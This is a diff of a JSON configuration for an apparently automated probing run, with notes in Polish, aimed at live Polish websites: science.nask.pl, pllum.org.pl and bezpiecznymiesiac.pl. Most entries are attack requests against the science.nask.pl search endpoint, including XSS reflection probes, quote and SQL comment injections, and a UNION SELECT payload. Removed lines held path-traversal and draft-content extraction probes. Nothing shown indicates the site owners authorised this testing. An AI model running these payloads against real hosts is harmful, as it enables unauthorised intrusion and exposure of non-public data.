@@ -1,114 +1,115 @@
 {
-  "run": "019",
+  "run": "020",
   "rps": 1.0,
-  "note": "DWA NOWE POMIARY Z RUNU 018, oba na trasach, ktore wczesniej nikt nie ruszyl. (1) science.nask.pl/api/search zwraca 400 {'error':...} 47 B - a nie 404 - wiec trasa ISTNIEJE i przyjmuje parametr zapytania. To pierwsza realna powierzchnia parametru na science (Tier 2), ktorej nie sprawdzil nikt: poprzednie sesje zauwazyy tylko 'brak refleksji'. (2) pllum.org.pl/api/_content/query zwraca 200 JSON 9543 B - otwarte API tresci Nuxt Content. Sprawdzam, czy oddaje wpisy NIEPUBLIKOWANE (_draft:true), bo to jest klasa 'dostep do danych niepublicznych', a nie tylko publiczna tresc. Kalibracja z run 018: na zglos (Next.js) trasa tylko-do-POST daje 405, na science 405, na 116sos brak trasy daje 404 - wiec 400 i 200 sa tu jednoznaczne.",
+  "note": "PRZELOM Z RUNU 019: parametr wyszukiwarki na science.nask.pl to 'query', NIE 'q'. Dlatego poprzednie sesje widzialy wylacznie 400 {'error':'Query must be at least 3 characters'} i odpuszczaly - sprawdzali zla nazwe. ?query=abc zwraca 200 JSON 49 B. To pierwsza dzialajaca trasa z parametrem na science (Tier 2), ktorej nikt nie przetestowal pod katem injection, bo sadzono, ze trasa nie dziala. Ten przebieg: refleksja, escapowanie metaznakow, apostrof (1 i 2), dlugosc, parametry dodatkowe, pusty ciag. Wszystko GET, bez zmiany stanu. Dodatkowo bezpiecznymiesiac.pl: 308 na /api/ -> /api/, wiec sprawdzam cel i szablon.",
   "probes": [
     {
-      "id": "sci-search-noparam",
-      "url": "https://science.nask.pl/api/search",
-      "snippet": true,
-      "note": "KONTROLA: znane 400 z 47 B - czytam dokladna tresc bledu, bo mowi, jaki parametr jest wymagany"
-    },
-    {
-      "id": "sci-search-3chars",
-      "url": "https://science.nask.pl/api/search?q=abc",
-      "snippet": true,
-      "note": "KONTROLA POZYTYWNA: minimalna dlugosc spelniona - czy zwraca 200 i JSON"
-    },
-    {
-      "id": "sci-search-2chars",
-      "url": "https://science.nask.pl/api/search?q=ab",
-      "note": "ponizej progu: potwierdza walidacje dlugosci i ze parametr to q"
-    },
-    {
-      "id": "sci-search-param-alt",
+      "id": "sci-q-control",
       "url": "https://science.nask.pl/api/search?query=abc",
-      "note": "inna nazwa parametru: rozstrzyga kontrakt bez zgadywania wartosci"
+      "snippet": true,
+      "note": "KONTROLA POZYTYWNA: 200 JSON 49 B - czytam dokladne cialo, zeby znac kontrakt (results? total? puste?)"
     },
     {
-      "id": "sci-search-reflect",
-      "url": "https://science.nask.pl/api/search?q=zzqx9probe",
+      "id": "sci-q-reflect",
+      "url": "https://science.nask.pl/api/search?query=zzqx9probe",
       "reflect": "zzqx9probe",
-      "note": "refleksja: czy fraza wraca w odpowiedzi (JSON czy HTML) - punkt wyjscia dla XSS"
+      "snippet": true,
+      "note": "refleksja frazy w odpowiedzi: punkt wyjscia dla XSS i dla wycieku bledu"
     },
     {
-      "id": "sci-search-angle",
-      "url": "https://science.nask.pl/api/search?q=zzqx9%3Cb%3Ezzqx9b%3C%2Fb%3E",
+      "id": "sci-q-angle",
+      "url": "https://science.nask.pl/api/search?query=zzqx9%3Cb%3Ezzqx9b",
       "reflect": "zzqx9b",
       "note": "metaznaki HTML: w oknie refleksji szukam DOSLOWNEGO <b> (kandydat) kontra &lt;b&gt; (bezpiecznie)"
     },
     {
-      "id": "sci-search-quote",
-      "url": "https://science.nask.pl/api/search?q=zzqx9%27",
+      "id": "sci-q-quote1",
+      "url": "https://science.nask.pl/api/search?query=zzqx9%27",
       "snippet": true,
-      "note": "apostrof: minimalna sonda bledu zapytania. WAF moze przerwac - to tez wynik, ale wtedy powtorze wolniej"
+      "note": "pojedynczy apostrof: minimalna sonda bledu zapytania (5 znakow spelnia minimum)"
     },
     {
-      "id": "sci-search-quote2",
-      "url": "https://science.nask.pl/api/search?q=zzqx9%27%27",
+      "id": "sci-q-quote2",
+      "url": "https://science.nask.pl/api/search?query=zzqx9%27%27",
       "snippet": true,
-      "note": "podwojny apostrof: jesli jeden daje blad a dwa nie, to sygnatura niezbalansowanego cudzyslowu w zapytaniu"
+      "note": "podwojny apostrof: jesli jeden daje blad a dwa nie, to sygnatura niezbalansowanego cudzyslowu"
     },
     {
-      "id": "sci-search-traversal",
-      "url": "https://science.nask.pl/api/search?q=..%2f..%2f..%2fetc%2fhostname",
-      "note": "LFI przez parametr frazy: czy serwer traktuje fraze jako sciezke. Cel nieszkodliwy"
+      "id": "sci-q-comment",
+      "url": "https://science.nask.pl/api/search?query=zzqx9%27--",
+      "snippet": true,
+      "note": "apostrof + komentarz SQL: klasyczna para testowa. Tylko odczyt"
     },
     {
-      "id": "sci-search-limit",
-      "url": "https://science.nask.pl/api/search?q=abc&limit=1000",
-      "note": "czy parametr limitu jest honorowany: rozmiar vs kontrola 3chars"
+      "id": "sci-q-union",
+      "url": "https://science.nask.pl/api/search?query=zzqx9%27%20UNION%20SELECT%20NULL--",
+      "snippet": true,
+      "note": "prob UNION: jesli cialo zmieni schemat (wiecej kolumn), to realna sygnatura. WAF moze przerwac - wtedy zapisze jako utracony pomiar"
     },
     {
-      "id": "sci-search-page",
-      "url": "https://science.nask.pl/api/search?q=abc&page=1",
+      "id": "sci-q-empty",
+      "url": "https://science.nask.pl/api/search?query=",
+      "snippet": true,
+      "note": "pusty ciag: czy walidacja dlugosci dziala na wartosci puste"
+    },
+    {
+      "id": "sci-q-special",
+      "url": "https://science.nask.pl/api/search?query=zzqx9%25%5F",
+      "note": "znaki wieloznaczne SQL (procent, podkreslnik): czy fraza idzie do LIKE bez escapowania (rozni sie od kontroli?)"
+    },
+    {
+      "id": "sci-q-limit",
+      "url": "https://science.nask.pl/api/search?query=abc&limit=1000",
+      "snippet": true,
+      "note": "czy limit jest honorowany: rozmiar i cialo vs kontrola"
+    },
+    {
+      "id": "sci-q-page",
+      "url": "https://science.nask.pl/api/search?query=abc&page=1",
       "note": "paginacja: rozstrzyga kontrakt listy"
     },
     {
-      "id": "pllum-query-control",
-      "url": "https://pllum.org.pl/api/_content/query",
+      "id": "sci-q-lang",
+      "url": "https://science.nask.pl/api/search?query=abc&lang=en",
+      "note": "parametr jezyka: czy istnieje drugi wymiar zapytania"
+    },
+    {
+      "id": "sci-q-long",
+      "url": "https://science.nask.pl/api/search?query=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+      "note": "100 znakow: czy istnieje gorny limit (brak limitu sam nie jest podatnoscia, ale ujawnia walidacje)"
+    },
+    {
+      "id": "sci-q-unicode",
+      "url": "https://science.nask.pl/api/search?query=za%C5%BC%C3%B3%C5%82%C4%87",
       "snippet": true,
-      "note": "KONTROLA: znane 200 JSON 9543 B - pelna odpowiedz do analizy schematu kluczy"
+      "note": "polskie znaki w zapytaniu: czy kodowanie jest obslugiwane poprawnie"
     },
     {
-      "id": "pllum-query-drafts",
-      "url": "https://pllum.org.pl/api/_content/query?where=%7B%22_draft%22%3Atrue%7D",
+      "id": "bym-api-slash",
+      "url": "https://bezpiecznymiesiac.pl/api/",
       "snippet": true,
-      "note": "KLUCZOWE: czy API tresci oddaje wpisy NIEOPUBLIKOWANE. Jesli tak, to dostep do danych niepublicznych"
+      "note": "cel przekierowania 308 z runu 019 - czy /api/ to realne API czy strona"
     },
     {
-      "id": "pllum-query-paths",
-      "url": "https://pllum.org.pl/api/_content/query?only=_path",
+      "id": "bym-api-404",
+      "url": "https://bezpiecznymiesiac.pl/api/zzqx9-nie-ma/",
+      "note": "KONTROLA: szablon dla nieistniejacej trasy pod /api/ (z ukosnikiem, jak wymusza przekierowanie)"
+    },
+    {
+      "id": "bym-api-search",
+      "url": "https://bezpiecznymiesiac.pl/api/search/",
+      "note": "czy ten host ma wyszukiwarke pod /api/"
+    },
+    {
+      "id": "bym-api-contact",
+      "url": "https://bezpiecznymiesiac.pl/api/contact/",
+      "note": "formularz kontaktowy pod /api/"
+    },
+    {
+      "id": "bym-robots-slash",
+      "url": "https://bezpiecznymiesiac.pl/robots.txt",
       "snippet": true,
-      "note": "enumeracja wszystkich sciezek tresci: czy sa wpisy, ktorych nie ma w nawigacji"
-    },
-    {
-      "id": "pllum-cache",
-      "url": "https://pllum.org.pl/api/_content/cache",
-      "snippet": true,
-      "note": "pelny cache Nuxt Content: czesto wiecej niz query (wszystkie kolekcje naraz)"
-    },
-    {
-      "id": "pllum-query-all",
-      "url": "https://pllum.org.pl/api/_content/query?only=_path,_draft,_partial",
-      "snippet": true,
-      "note": "trzy pola naraz: minimalny odczyt, ktory rozstrzyga o istnieniu wpisow niepublicznych"
-    },
-    {
-      "id": "bym-control",
-      "url": "https://bezpiecznymiesiac.pl/api/zzqx9-nie-ma",
-      "note": "KONTROLA dla bezpiecznymiesiac.pl: szablon 404 dla /api/* (host zyje, 93 KB strona glowna, ale nie znam jego szablonu API)"
-    },
-    {
-      "id": "bym-api-root",
-      "url": "https://bezpiecznymiesiac.pl/api",
-      "note": "korzen API na hoscie, ktory nie byl nigdy sondowany"
-    },
-    {
-      "id": "bym-sitemap",
-      "url": "https://bezpiecznymiesiac.pl/sitemap.xml",
-      "snippet": true,
-      "note": "sitemapa: realne trasy zamiast zgadywania"
+      "note": "robots bez ukosnika (run 018 dal 404 z HTML, sprawdzam czy to soft-404)"
     }
   ]
 }
